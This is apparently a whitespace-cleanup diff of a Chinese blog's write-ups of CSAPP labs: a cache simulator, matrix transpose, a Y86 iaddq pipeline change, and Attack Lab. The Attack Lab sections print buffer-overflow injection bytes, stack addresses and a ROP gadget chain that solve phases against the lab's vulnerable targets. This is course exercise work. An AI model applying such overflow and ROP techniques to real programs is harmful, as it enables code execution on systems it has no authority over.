+L 10,1 miss
+M 20,1 miss hit
+L 22,1 hit
+S 18,1 hit
+L 110,1 miss eviction
+L 210,1 miss eviction
+M 12,1 miss eviction hit
 hits:4 misses:5 evictions:3
 </code></pre></div></div> <p>我们的程序<code class="language-plaintext highlighter-rouge">csim.c</code>就是要模拟cache的机制，统计上述的输出信息。</p> <p>首先来剖析一下这个输入输出</p> <p>输入参数给定了(S, E, B, m) = (16, 1, 16, 64)</p> <p>(m = 64bit 假设是64位机器)</p> <p>所以地址分段应该是这样:</p> <table> <thead> <tr> <th>t</th> <th>s</th> <th>b</th> </tr> </thead> <tbody> <tr> <td>56</td> <td>4</td> <td>4</td> </tr> </tbody> </table> <p>所以这个cache有16组，每组1行，一行的数据块有16个。</p> <p>第一个操作<code class="language-plaintext highlighter-rouge">L 10,1 miss</code>因为cache为空，加载地址<code class="language-plaintext highlighter-rouge">0x10</code>时，第1组第0块没内容，所以miss</p> <p>miss之后，将内存<code class="language-plaintext highlighter-rouge">0x10</code>开始的内容加载到cache中</p> <p>接下来就是<code class="language-plaintext highlighter-rouge">M 20,1 miss hit</code>此时第二组仍然是空，所以miss，加载地址<code class="language-plaintext highlighter-rouge">0x20</code>开始的内容到cache中</p> <p>之后修改，所以hit</p> <p>后续同理……</p> <hr/> <p>对于编写<code class="language-plaintext highlighter-rouge">csim.c</code>有以下要求:</p> <ul> <li>开头注释标明姓名和ID</li> <li>不能有任何警告</li> <li>对于任意参数s,E,b都能正确工作</li> <li>忽略<code class="language-plaintext highlighter-rouge">trace</code>中的所有取指信息(<code class="language-plaintext highlighter-rouge">I</code>开头的)</li> <li>最后必须调用<code class="language-plaintext highlighter-rouge">printSummary()</code>统计信息</li> <li>在本实验中，您应假设内存访问已正确对齐，因此单次内存访问绝不会跨越块边界。有了这个假设，你就可以忽略 valgrind 跟踪中的请求大小。</li> </ul> <p>而且eviction要满足LRU</p> <p>这不就是leetcode的LRU题么</p> <p>输入来自<code class="language-plaintext highlighter-rouge">valgrind</code>的trace信息，以及s, E, b参数，模拟cache行为并统计信息</p> <p>在Part A开始之前，<code class="language-plaintext highlighter-rouge">writeup</code>有几个建议:</p> <ul> <li>可以先在小的trace文件进行debug</li> <li>推荐实现<code class="language-plaintext highlighter-rouge">-v</code>选项，毕竟方便debug</li> <li>推荐使用<code class="language-plaintext highlighter-rouge">getopt.h</code>来解析参数(一般shell程序用这个来解析args)</li> <li>每次数据加载 (L) 或存储 (S) 操作最多只能导致一次cache miss。数据修改操作 (M) 被视为加载然后存储到同一地址的操作。因此，一个 M 操作可能会导致两次缓存hits，或一次miss和一次hit加上一次可能的eviction。</li> </ul> <p>解析参数参考一下<code class="language-plaintext highlighter-rouge">getopt()</code>函数很容易写出</p> <p>这里重点考虑构造cache的数据结构。</p> <p>首先是<code class="language-plaintext highlighter-rouge">cacheRow</code>的数据结构，包含一个<code class="language-plaintext highlighter-rouge">valid bit</code>和一个<code class="language-plaintext highlighter-rouge">tag</code> 由于不关注<code class="language-plaintext highlighter-rouge">block</code>的内容本身，所以<code class="language-plaintext highlighter-rouge">block</code>可以省略。</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">hits</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="kt">int</span> <span class="n">misses</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="kt">int</span> <span class="n">evictions</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 
 <span class="cm">/**
- * @brief This is a cache line, which line has a valid bit, tags and blocks. 
+ * @brief This is a cache line, which line has a valid bit, tags and blocks.
  */</span>
 <span class="k">struct</span> <span class="n">cacheRow</span> <span class="p">{</span>
     <span class="kt">int</span> <span class="n">valid</span><span class="p">;</span>  <span class="cm">/** valid bit */</span>
@@ -1016,7 +1016,7 @@ hits:4 misses:5 evictions:3
 
 <span class="cm">/**
  * @brief Add the node to head of a deque.
- * 
+ *
  * @param[in] dq deque
  * @param[in] node node
  */</span>
@@ -1030,7 +1030,7 @@ hits:4 misses:5 evictions:3
 
 <span class="cm">/**
  * @brief Remove a node from its deque.
- * 
+ *
  * @param[in] node node
  */</span>
 <span class="kt">void</span> <span class="nf">removeNode</span><span class="p">(</span><span class="n">node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
@@ -1040,7 +1040,7 @@ hits:4 misses:5 evictions:3
 
 <span class="cm">/**
  * @brief Move a node to its deque's head.
- * 
+ *
  * @param[in] dq deque
  * @param[in] node node
  */</span>
@@ -1051,9 +1051,9 @@ hits:4 misses:5 evictions:3
 
 <span class="cm">/**
  * @brief Remove a tail from a deque.
- * 
+ *
  * @param[in] dq deque
- * 
+ *
  * @return the tail node
  */</span>
 <span class="n">node</span><span class="o">*</span> <span class="nf">removeTail</span><span class="p">(</span><span class="n">deque</span><span class="o">*</span> <span class="n">dq</span><span class="p">)</span> <span class="p">{</span>
@@ -1063,7 +1063,7 @@ hits:4 misses:5 evictions:3
 <span class="p">}</span>
 </code></pre></div></div> <p>顺便实现几个API方便后续LRU调用</p> <p>那么接下来就考虑<code class="language-plaintext highlighter-rouge">cache</code>的初始化，需要初始化各个组的deque:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
  * @brief Initialize cache
- * 
+ *
  * @param[in] s set bits
  * @param[in] E lines per line
  */</span>
@@ -1102,9 +1102,9 @@ hits:4 misses:5 evictions:3
 
 <span class="cm">/**
  * @brief Parse the trace line to get op and address.
- * 
+ *
  * @param[in] line a line of trace info
- * 
+ *
  * @return operation and address
  */</span>
 <span class="k">struct</span> <span class="n">traceLine</span><span class="o">*</span> <span class="nf">parseTraces</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">line</span><span class="p">)</span> <span class="p">{</span>
@@ -1132,7 +1132,7 @@ hits:4 misses:5 evictions:3
 <span class="p">}</span>
 </code></pre></div></div> <p>那么最核心的就是模拟<code class="language-plaintext highlighter-rouge">cache</code>的行为了:</p> <ol> <li>通过<code class="language-plaintext highlighter-rouge">address</code>的<code class="language-plaintext highlighter-rouge">s</code>字段获取组号</li> <li>对该组的每一行检查是否直接<code class="language-plaintext highlighter-rouge">hit</code> (<code class="language-plaintext highlighter-rouge">valid</code>且<code class="language-plaintext highlighter-rouge">tag</code>相同)</li> <li>如果直接<code class="language-plaintext highlighter-rouge">hit</code>那么直接返回，如果没有，那么继续</li> <li>找出空的<code class="language-plaintext highlighter-rouge">cache</code>行，如果该组内无空行，根据<code class="language-plaintext highlighter-rouge">deque</code>和LRU算法筛选出一行</li> <li>对选中的这行进行初始化<code class="language-plaintext highlighter-rouge">valid</code>和<code class="language-plaintext highlighter-rouge">tag</code>（加载到<code class="language-plaintext highlighter-rouge">cache</code>）并将对应的结点加入到<code class="language-plaintext highlighter-rouge">deque</code></li> <li>检查加入到<code class="language-plaintext highlighter-rouge">deque</code>后是否超出容量(<code class="language-plaintext highlighter-rouge">E</code>)并修正</li> <li>需要注意的是如果操作符是<code class="language-plaintext highlighter-rouge">M</code>则表示<code class="language-plaintext highlighter-rouge">L</code> + <code class="language-plaintext highlighter-rouge">S</code>只需要在最后的时候多一次<code class="language-plaintext highlighter-rouge">hit</code>即可</li> </ol> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
  * @brief Simulate cache
- * 
+ *
  * @param[in] line trace info
  * @param[in] s set bits
  * @param[in] E lines per set
@@ -1265,8 +1265,8 @@ func 0 (Transpose submission): hits:1710, misses:343, evictions:311
         <span class="p">}</span>
     <span class="p">}</span>
 <span class="p">}</span>
-</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">./test-trans -M 32 -N 32</code>发现misses变为287了，满分。</p> <hr/> <p>对于64 * 64的尺寸，这里变得有点困难，按照前面的思路并且经过测试misses是绝对会超过阈值的。</p> <p>如果继续以8 * 8为小块分块，将会有64块小块。而且因为尺寸变大，这里小块的前四行就会把cache占满(1行A小块7行B列，共4组32行占满)。</p> <p>难道真的回天乏术了吗？</p> <p>说实话，卡在这里非常久，在<code class="language-plaintext highlighter-rouge">writeup</code>中注意到这句话:</p> <blockquote> <p>Your transpose function may not modify array A. You may, however, do whatever you want with the contents of array B.</p> </blockquote> <p>也就是可能需要利用B矩阵在cache中的内容作为一个类似buffer的角色。</p> <p>对于一个8 * 8的小块，在内部继续划分成4个小块，一个小块是4 * 4，记小小块的id为0，1，2，3</p> <p>对于一个8 * 8的小块，其转置过程如下:</p> <ol> <li>A块0正常转置到B的块0</li> <li>A块1转置暂存到B的块1（正常应该是B的块3）</li> <li>临时变量暂存B的块1</li> <li>A块3正常转置到B的块1</li> <li>临时变量赋值给B的块3</li> <li>最后正常转置A的块3到B的块2</li> </ol> <p>然后对于每个8 * 8小块都执行上述操作。图片可以参考<a href="https://www.zixiangcode.top/article/csapp-cachelab#0aa5043cbefd40c29de6dcaf4eed542a">这里</a>的笔记</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">transpose_64x64</span><span class="p">(</span><span class="kt">int</span> <span class="n">M</span><span class="p">,</span> <span class="kt">int</span> <span class="n">N</span><span class="p">,</span> <span class="kt">int</span> <span class="n">A</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">M</span><span class="p">],</span> <span class="kt">int</span> <span class="n">B</span><span class="p">[</span><span class="n">M</span><span class="p">][</span><span class="n">N</span><span class="p">])</span>
-<span class="p">{</span>   
+</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">./test-trans -M 32 -N 32</code>发现misses变为287了，满分。</p> <hr/> <p>对于64 * 64的尺寸，这里变得有点困难，按照前面的思路并且经过测试misses是绝对会超过阈值的。</p> <p>如果继续以8 * 8为小块分块，将会有64块小块。而且因为尺寸变大，这里小块的前四行就会把cache占满(1行A小块7行B列，共4组32行占满)。</p> <p>难道真的回天乏术了吗？</p> <p>说实话，卡在这里非常久，在<code class="language-plaintext highlighter-rouge">writeup</code>中注意到这句话:</p> <blockquote> <p>Your transpose function may not modify array A. You may, however, do whatever you want with the contents of array B.</p> </blockquote> <p>也就是可能需要利用B矩阵在cache中的内容作为一个类似buffer的角色。</p> <p>对于一个8 _ 8的小块，在内部继续划分成4个小块，一个小块是4 _ 4，记小小块的id为0，1，2，3</p> <p>对于一个8 * 8的小块，其转置过程如下:</p> <ol> <li>A块0正常转置到B的块0</li> <li>A块1转置暂存到B的块1（正常应该是B的块3）</li> <li>临时变量暂存B的块1</li> <li>A块3正常转置到B的块1</li> <li>临时变量赋值给B的块3</li> <li>最后正常转置A的块3到B的块2</li> </ol> <p>然后对于每个8 * 8小块都执行上述操作。图片可以参考<a href="https://www.zixiangcode.top/article/csapp-cachelab#0aa5043cbefd40c29de6dcaf4eed542a">这里</a>的笔记</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">transpose_64x64</span><span class="p">(</span><span class="kt">int</span> <span class="n">M</span><span class="p">,</span> <span class="kt">int</span> <span class="n">N</span><span class="p">,</span> <span class="kt">int</span> <span class="n">A</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">M</span><span class="p">],</span> <span class="kt">int</span> <span class="n">B</span><span class="p">[</span><span class="n">M</span><span class="p">][</span><span class="n">N</span><span class="p">])</span>
+<span class="p">{</span>
     <span class="kt">int</span> <span class="n">a0</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a5</span><span class="p">,</span> <span class="n">a6</span><span class="p">,</span> <span class="n">a7</span><span class="p">;</span>
     <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
         <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">M</span><span class="p">;</span> <span class="n">j</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
@@ -1399,7 +1399,7 @@ loop:
         addq    %r10, %rax      # val += ls -&gt; val;
         mrmovq  8(%rdi), %rdi
         jmp     loop
-exit:   
+exit:
         ret
 
 # Stack starts here and grows to lower addresses
@@ -1524,13 +1524,13 @@ word ifun = [
 	1: imem_ifun;		# Default: get from instruction memory
 ];
 
-bool instr_valid = icode in 
+bool instr_valid = icode in
 	{ INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,
 	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ };
 
 # Does fetched instruction require a regid byte?
 bool need_regids =
-	icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, 
+	icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ,
 		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ };
 
 # Does fetched instruction require a constant word?
@@ -1578,7 +1578,7 @@ word aluA = [
 
 ## Select input B to ALU
 word aluB = [
-	icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL, 
+	icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL,
 		      IPUSHQ, IRET, IPOPQ, IIADDQ } : valB;
 	icode in { IRRMOVQ, IIRMOVQ } : 0;
 	# Other instructions don't need ALU
@@ -1619,7 +1619,7 @@ unix <span class="o">&gt;</span> <span class="nb">cd</span> ../ptest<span class=
 </code></pre></div></div> <p>有多个地方用到了这样的一套招数:</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">irmovq</span> <span class="kc">$</span><span class="mi">1</span><span class="p">,</span> <span class="o">%</span><span class="nv">r10</span>
 <span class="nf">addq</span>   <span class="o">%</span><span class="nv">r10</span><span class="p">,</span> <span class="o">%</span><span class="nb">rax</span>
 </code></pre></div></div> <p>因为原本的<code class="language-plaintext highlighter-rouge">OPq</code>不支持立即数直接和寄存器运算。如果我们实现<code class="language-plaintext highlighter-rouge">iaddq</code>会不会有优化呢？(Let’s figure it out.)</p> <h2 id="实现iaddq">实现IADDQ</h2> <p>这里的实现<code class="language-plaintext highlighter-rouge">iaddq</code>和<code class="language-plaintext highlighter-rouge">Part B</code>的差别不大。</p> <p>记得对照<code class="language-plaintext highlighter-rouge">4.5.7 PIPE各个阶段的实现</code>来修改<code class="language-plaintext highlighter-rouge">pipe-full.hcl</code></p> <h3 id="fetch-stage">Fetch Stage</h3> <p>取指阶段修改三个字段的内容，同<code class="language-plaintext highlighter-rouge">Part B</code>一样：<code class="language-plaintext highlighter-rouge">instr_valid</code>, <code class="language-plaintext highlighter-rouge">need_regids</code>, <code class="language-plaintext highlighter-rouge">need_valC</code>(其他没涉及)</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Is instruction valid?
-bool instr_valid = f_icode in 
+bool instr_valid = f_icode in
 	{ INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,
 	  IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ };
 
@@ -1633,7 +1633,7 @@ word f_stat = [
 
 # Does fetched instruction require a regid byte?
 bool need_regids =
-	f_icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, 
+	f_icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ,
 		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ };
 
 # Does fetched instruction require a constant word?
@@ -1663,7 +1663,7 @@ word aluA = [
 
 ## Select input B to ALU
 word aluB = [
-	E_icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL, 
+	E_icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL,
 		     IPUSHQ, IRET, IPOPQ, IIADDQ } : E_valB;
 	E_icode in { IRRMOVQ, IIRMOVQ } : 0;
 	# Other instructions don't need ALU
@@ -1908,7 +1908,7 @@ PASS: Would have posted the following:
 	user <span class="nb">id	</span>bovik
 	course	15213-f15
 	lab	attacklab
-	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
+	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
 
 </code></pre></div></div> <h2 id="phase-2">Phase 2</h2> <p>第二个阶段要求带参数进入<code class="language-plaintext highlighter-rouge">touch2</code>函数，<code class="language-plaintext highlighter-rouge">%rdi</code>作为第一个参数传递。</p> <p>问题在于，现在我们可以利用缓冲区溢出，修改上一个栈帧的栈顶，也就是ret指令的返回值。</p> <p>但是如何执行参数赋值呢？</p> <p>正常来说带参数调用函数，应该是先对参数赋值，然后进入函数。</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">movl</span> <span class="kc">$</span><span class="nv">cookie</span><span class="p">,</span> <span class="o">%</span><span class="nb">edi</span>
 <span class="nf">call</span> <span class="o">&lt;</span><span class="nv">touch2</span><span class="o">&gt;</span>
@@ -1916,7 +1916,7 @@ PASS: Would have posted the following:
 00 00 00 00 00 00 00 00     # 那么这里的地址是0xabcde8
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00     # 到这里填充完getbuf的栈帧  
+00 00 00 00 00 00 00 00     # 到这里填充完getbuf的栈帧
 e0 cd ab 00 00 00 00 00     # 这里篡改了ret的返回函数地址 &lt;- %rsp + 0x28
 </code></pre></div></div> <p>需要注意的是，执行完了movl给第一个参数赋值cookie，我们要跳转到<code class="language-plaintext highlighter-rouge">touch2</code>: 0x4017ec的位置</p> <p>writeup中说明了，最好不要使用call或者jmp指令，所以我们仍然使用ret指令。</p> <p>当<code class="language-plaintext highlighter-rouge">getbuf</code>内部的ret指令执行完毕后，PC指向攻击代码的部分，同时，%rsp指向原本栈帧<code class="language-plaintext highlighter-rouge">test</code>函数的部分</p> <p>为了跳转<code class="language-plaintext highlighter-rouge">touch2</code>，我们要push一次<code class="language-plaintext highlighter-rouge">touch2</code>的地址。</p> <p>所以初步的攻击代码如下:</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">movl</span>    <span class="kc">$</span><span class="mh">0x59b997fa</span><span class="p">,</span> <span class="o">%</span><span class="nb">edi</span>
 <span class="nf">pushq</span>   <span class="kc">$</span><span class="mh">0x4017ec</span>
@@ -1933,7 +1933,7 @@ Disassembly of section .text:
 0000000000000000 &lt;.text&gt;:
    0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
    5:	68 ec 17 40 00       	pushq  $0x4017ec
-   a:	c3                   	retq   
+   a:	c3                   	retq
 </code></pre></div></div> <p>同时，需要知道当程序运行到<code class="language-plaintext highlighter-rouge">getbuf</code>时，<code class="language-plaintext highlighter-rouge">%rsp</code>寄存器的值，因为我们需要绕回到这个地址然后逐行执行攻击代码。</p> <p>在<code class="language-plaintext highlighter-rouge">getbuf</code>第二行汇编处断点，用gdb调试打印<code class="language-plaintext highlighter-rouge">%rsp</code>寄存器的值即可。</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> i r rsp
 0x5561dc78
 </code></pre></div></div> <p>所以level2的注入代码如下:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bf fa 97 b9 59 68 ec 17
@@ -1951,7 +1951,7 @@ xx xx xx xx xx xx xx xx #
 xx xx xx xx xx xx xx xx #
 xx xx xx xx xx xx xx xx #
 xx xx xx xx xx xx xx xx # &lt;- %rsp的位置 同时也是缓冲区输入的位置
-</code></pre></div></div> <p>按照level2的攻击方式，我们先把最后一行填充完毕，然后覆盖掉<code class="language-plaintext highlighter-rouge">ret address</code>的地址，让%rip指向上面的最后一行，也就是注入的代码。从而执行攻击代码。</p> <p>但是writeup中提及，当<code class="language-plaintext highlighter-rouge">hexmatch</code>和<code class="language-plaintext highlighter-rouge">strncmp</code>调用的时候，会push数据到栈中。</p> <p>下面是<code class="language-plaintext highlighter-rouge">getbuf</code>执行完毕后栈的情况:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?? ?? ?? ?? ?? ?? ?? ?? # test函数的栈帧 &lt;- %rsp的位置 
+</code></pre></div></div> <p>按照level2的攻击方式，我们先把最后一行填充完毕，然后覆盖掉<code class="language-plaintext highlighter-rouge">ret address</code>的地址，让%rip指向上面的最后一行，也就是注入的代码。从而执行攻击代码。</p> <p>但是writeup中提及，当<code class="language-plaintext highlighter-rouge">hexmatch</code>和<code class="language-plaintext highlighter-rouge">strncmp</code>调用的时候，会push数据到栈中。</p> <p>下面是<code class="language-plaintext highlighter-rouge">getbuf</code>执行完毕后栈的情况:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?? ?? ?? ?? ?? ?? ?? ?? # test函数的栈帧 &lt;- %rsp的位置
 [ret address (64bit)]   # 因为ret将%rip的位置设置到了这一行的地址
 xx xx xx xx xx xx xx xx # getbuf分配了0x28 * 64bit的空间(64位机器)
 xx xx xx xx xx xx xx xx #
@@ -1970,7 +1970,7 @@ xx xx xx xx xx xx xx xx # &lt;- %rip 即将要执行的攻击代码
 <span class="err">0000000000000000</span> <span class="o">&lt;</span><span class="nf">.text</span><span class="o">&gt;</span><span class="p">:</span>
    <span class="err">0</span><span class="p">:</span>	<span class="err">48</span> <span class="nf">c7</span> <span class="nv">c7</span> <span class="nv">a8</span> <span class="nv">dc</span> <span class="mi">61</span> <span class="mi">55</span> 	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x5561dca8</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>
    <span class="err">7</span><span class="p">:</span>	<span class="err">68</span> <span class="nf">fa</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="nv">pushq</span>  <span class="kc">$</span><span class="mh">0x4018fa</span>
-   <span class="nl">c:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+   <span class="nl">c:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>
 
 </code></pre></div></div> <p>所以答案<code class="language-plaintext highlighter-rouge">phase3.txt</code>是:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>48 c7 c7 a8 dc 61 55 68 # 攻击代码从这里开始 %rip是逐行执行
 fa 18 40 00 c3 00 00 00
@@ -1989,7 +1989,7 @@ Disassembly of section .text:
 0000000000000000 &lt;.text&gt;:
    0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
    5:	68 ec 17 40 00       	pushq  $0x4017ec
-   a:	c3                   	retq   
+   a:	c3                   	retq
 </code></pre></div></div> <p>然后我们能够控制的就是缓冲区的输入，替换掉ret的地址，然后一直链式反应，执行我们的代码.</p> <p>比如<code class="language-plaintext highlighter-rouge">ret</code>的字节码是<code class="language-plaintext highlighter-rouge">c3</code>, <code class="language-plaintext highlighter-rouge">nop</code>的字节码是<code class="language-plaintext highlighter-rouge">90</code></p> <p>那么我们需要有这样的栈结构（尽管会破坏test函数栈）:</p> <p>当<code class="language-plaintext highlighter-rouge">getbuf</code>执行完毕，<code class="language-plaintext highlighter-rouge">%rsp</code>加上<code class="language-plaintext highlighter-rouge">0x28</code>然后指向下面的<code class="language-plaintext highlighter-rouge">address</code></p> <p>然后进行<code class="language-plaintext highlighter-rouge">ret</code>指令</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>address + 0x8: [gadget 2的地址]
 address:       [gadget 1的地址]  # &lt;- %rsp 即将ret跳转到gadget1
 --------上面是栈的结构----------
@@ -2015,7 +2015,7 @@ fa 97 b9 59 00 00 00 00
 ec 17 40 00 00 00 00 00
 </code></pre></div></div> <p>精彩，不过为什么没用到<code class="language-plaintext highlighter-rouge">farm</code>的代码段呢，<em>无所谓了</em>。</p> <p>只要达到了攻击效果就行。</p> <p>（然而我仔细阅读了writeup之后发现，我们需要的字节码都能够在<code class="language-plaintext highlighter-rouge">start_farm</code>到<code class="language-plaintext highlighter-rouge">mid_farm</code>中找到, 其实就是pop到<code class="language-plaintext highlighter-rouge">%rax</code>中，然后再赋值给<code class="language-plaintext highlighter-rouge">%rdi</code>而已，只不过正好被我在别的程序段找到了更简洁的解法。）</p> <h2 id="phase-5">Phase 5</h2> <p>Phase5要求和Phase3一样，调用<code class="language-plaintext highlighter-rouge">touch3</code>并且传入字符串<code class="language-plaintext highlighter-rouge">cookie</code></p> <p>与Phase3不同的是，<code class="language-plaintext highlighter-rouge">rtarget</code>采用了栈随机化，导致我们的字符串若是存在栈中，我们需要解决栈的地址的问题。</p> <p>那么总体还是一样的，就是调用<code class="language-plaintext highlighter-rouge">touch3</code>之前，保证<code class="language-plaintext highlighter-rouge">%rdi</code>的值是字符串的地址。</p> <p>此外，还要将</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>35 39 62 39 39 37 66 61 # cookie的ASCII表示
 </code></pre></div></div> <p>存在那个地址。</p> <p>然后将<code class="language-plaintext highlighter-rouge">touch3</code>的地址压入栈中，<code class="language-plaintext highlighter-rouge">ret</code>指令进入<code class="language-plaintext highlighter-rouge">touch3</code>:<code class="language-plaintext highlighter-rouge">0x4018fa</code></p> <p>但是，<code class="language-plaintext highlighter-rouge">rtarget</code>中，我相信一定不会有这样的内存区域正好存着cookie的ASCII，所以这一串仍然需要我们通过缓冲区溢出的漏洞，写入栈帧中。</p> <p>那么问题就在于，如何在栈随机化的程序上，明确<code class="language-plaintext highlighter-rouge">%rsp</code>的值呢？</p> <p>或者，我们只需要<code class="language-plaintext highlighter-rouge">%rsp</code>的值赋值给<code class="language-plaintext highlighter-rouge">%rdi</code>，然后对<code class="language-plaintext highlighter-rouge">%rdi</code>进行一些加减操作，偏移到我们存储的地方即可。</p> <p>并且注意到<code class="language-plaintext highlighter-rouge">farm.c</code>中正好就有定义<code class="language-plaintext highlighter-rouge">add_xy(long x, long y)</code>:并且在<code class="language-plaintext highlighter-rouge">rtarget.asm</code>中的<code class="language-plaintext highlighter-rouge">0x4019d6</code></p> <p>那么显然我们有这样的栈结构和操作:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>address + 0x28:[cookie的ASCII]  # &lt;- %rdi + 0x20
-address + 0x20: [touch3的地址]    
+address + 0x20: [touch3的地址]
 address + 0x18: [add_xy()的地址]
 address + 0x10: [第二个参数:0x20]
 address + 0x8: [gadget 3的地址]  # mov %rsp, %rdi之前，%rsp是在这
@@ -2042,7 +2042,7 @@ c3       # ret
   <span class="err">401</span><span class="nl">aab:</span> <span class="nf">c7</span> <span class="mi">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">e0</span> <span class="mi">90</span>            	<span class="nv">movl</span>	<span class="kc">$</span><span class="mh">0x90e08948</span><span class="p">,</span> <span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>     <span class="err">#</span> <span class="nv">imm</span> <span class="err">=</span> <span class="mh">0x90E08948</span>
   <span class="err">401</span><span class="nl">ab1:</span> <span class="nf">c3</span>                           	<span class="nv">retq</span>
 </code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">48 89 e0</code>正好是<code class="language-plaintext highlighter-rouge">mov %rsp, %rax</code>是可以接受的，并且<code class="language-plaintext highlighter-rouge">90</code>是nop.</p> <p>那么还差一个<code class="language-plaintext highlighter-rouge">mov %rax, %rdi</code>是重复的。</p> <p>所以:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>address + 0x38: [cookie的ASCII]  # &lt;- %rdi + 0x30
-address + 0x30: [touch3的地址]     
+address + 0x30: [touch3的地址]
 address + 0x28: [gadget 6的地址]
 address + 0x20: [add_xy()的地址]
 address + 0x18: [第二个参数:0x28]
@@ -2064,7 +2064,7 @@ gadget 5: ret                   # 然后ret进入add_xy:0x4019d6
 *gadget 6: mov %rax, %rdi        # 加法结果保存为第一个参数
 *gadget 7: ret                   # 这是add_xy内部的ret
 </code></pre></div></div> <p>那么<code class="language-plaintext highlighter-rouge">gadgets</code>的字节码及其地址有:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>48 89 e0 # mov %rsp, %rax -&gt; 0x401a06
-c3       # ret            
+c3       # ret
 48 89 c7 # mov %rax, %rdi -&gt; 0x4019a2
 c3       # ret
 5e       # popq %rsi      -&gt; 0x401383
